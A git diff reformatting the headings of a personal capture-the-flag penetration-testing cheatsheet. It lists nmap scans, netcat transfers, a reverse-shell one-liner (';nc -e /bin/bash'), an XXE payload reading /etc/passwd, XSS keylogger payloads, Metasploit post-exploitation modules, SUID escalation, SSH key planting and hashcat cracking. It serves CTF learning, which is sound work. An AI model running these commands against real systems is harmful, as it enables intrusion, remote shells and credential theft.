@@ -1,5 +1,5 @@
 # docs-ctf-cheatsheet
-NMAP:
+### NMAP:
 nmap -sC -sV -oA nmap/initial IPADRESS (standart)
 nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS (quick scan of all ports)
 
@@ -9,14 +9,14 @@ nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS (quick scan of all ports)
 -sV : Attempts to determine the version of the service running on port
 -oA [dir] all output to [dir]
 
-NETCAT:
+### NETCAT:
 send data:
 	reciever:
 	nc -l -p 1234 > FILE.NAME       (sometimes netcat instead of nc!)
 	sender:
 	nc -w 3 DESTINATION 1234 < FILE.NAME
 
-MSF:
+### MSF:
 search
 	search …
 send data
@@ -30,7 +30,7 @@ get "normal" shell
 move out of a session
 	ctrl+z
 
-HTTPSERVER:
+### HTTPSERVER:
 send data:
 	sender:
 	python -m SimpleHTTPServer 8083
@@ -40,7 +40,7 @@ send data:
 	OR
 	wget IPADRESSSENDER:8083/FILE.NAME
 
-REVERSE SHELL:
+### REVERSE SHELL:
 1. setup listener on my machine:
 nc -lvnp 8081
 2. go to
@@ -48,7 +48,7 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 and try them out on target machine
 easiest rs : ;nc -e /bin/bash
 
-INTERACTIVE SHELL:
+### INTERACTIVE SHELL:
 target:
 	export RHOST=<IPADRESSATTACKER>
 attacker:
@@ -60,7 +60,7 @@ attacker (now on targetshell):
 	OR
 	python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-COMMAND INJECTION
+### COMMAND INJECTION
 Linux
 whoami
 id
@@ -77,20 +77,20 @@ ipconfig
 tasklist
 netstat -an
 
-CHECK IF SOMETHING IS EXECUTED
+### CHECK IF SOMETHING IS EXECUTED
 attacker:
 	sudo tcpdump ip proto \\icmp -i tun0
 target:
 	ping [local tun0 ip] -c 1
 
-BROKEN AUTHENTICATION:
+### BROKEN AUTHENTICATION:
 password guessing/bruteforce
 weak session cookies
 reregistration of existing user “ admin” (with space) and gain all rights of “admin”
 1. try register as randomname
 2. if “randomname has already been taken” try register with “ randomname” and see what happens
 
-XML EXTERNAL ENTITY (XXE):
+### XML EXTERNAL ENTITY (XXE):
 try :
 <?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
@@ -102,7 +102,7 @@ and:
   <lastName>&name;</lastName>
  </userInfo>
 
-XSS PAYLOADS:
+### XSS PAYLOADS:
 Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
 Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
 XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
@@ -110,7 +110,7 @@ Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html)
 test <img src=x onerror=alert(2)>
 
 
-POST EXPLOITATION WINDOWS:
+### POST EXPLOITATION WINDOWS:
 
 Get-WmiObject -Class win32_OperatingSystem (Power Shell)
 run post/windows/gather/checkvm (Metasploit) - check if vm
@@ -125,22 +125,22 @@ run autoroute -s [SUBNET IP] -n 255.255.255.0
 
 
 
-Enummeration Scripts:
-Local:
-LinEnum
-LinPEAS
-WinPEAS
-Remote:
-	enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA
+### Enummeration Scripts:
+#### Local:
+* LinEnum
+* LinPEAS
+* WinPEAS
+#### Remote:
+enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA
 
 
-SMBClient:
+### SMBClient:
 smbclient //[IP]/[DIRECTORY] -U [USERNAME]
 
-NFS:
+### NFS:
 sudo mount -t nfs [IP]:[tragetdirectory] /tmp/mount/ -nolock
 
-SUID:
+### SUID:
 find SUID : find / -perm -u=s -type f 2>/dev/null
 
 Exploit /usr/bin/menu with SUID :
@@ -151,20 +151,18 @@ Exploit /usr/bin/menu with SUID :
 	/usr/bin/menu
 
 
-DNS PROBLEM (for Hack The Box)
+### DNS PROBLEM (for Hack The Box)
 sudo nano /etc/hosts
 add [IPADRESS] [DOMAIN], save and it should work!
 
-SSH:
+### SSH:
 ssh-keygen -f [NAME]
 	now i can write the [NAME].pub file content (exept for the last part with my USER@IP
 and add “ssh-rsa “ before the key if not there) to the
 /home/[USER]/.ssh/authorized_keys/
 then ssh -i [NAME] [USER]@[IP]
 
-
-
-PYTHON VIRTUAL ENVIRONMENT
+### PYTHON VIRTUAL ENVIRONMENT
 	env init:
 		python3 -m venv [NAME UMGEBUNG]
 	env laden:
@@ -176,11 +174,11 @@ PYTHON VIRTUAL ENVIRONMENT
 	pip zeigt installierte packets:
 		pip3 freeze
 
-JAVA-VERSION ARCH LINUX
+### JAVA-VERSION ARCH LINUX
 some programs run only with a certain jre, so you can use the following to set the default jre on your system:
 sudo archlinux-java set java-8-openjdk/jre
 
-TMUX:
+### TMUX:
 	neue tmux session in gewünschter directory starten:
 		tmux new -s [NAME]
 	new  panel
@@ -196,14 +194,14 @@ navigate between panel
 resize panel
 	CMD+B + pfeiltasten
 
-GOBUSTER
+### GOBUSTER
 ./gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 maybe mit +x php
 
-MYSQL
+### MYSQL
 mysql -u [USER] -p'[PASSWORD]'
 
-HASHCAT (Windows)
+### HASHCAT (Windows)
 .\hashcat.exe -a [ATTACKTYPE] -m [HASHTYPE] [PATHTOHASHES] [PATHTODICTIONARY] -r [PATHTORULE]
 ATTACKTYPE : 0 for dictionary/dictionary-rule attack
 HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes
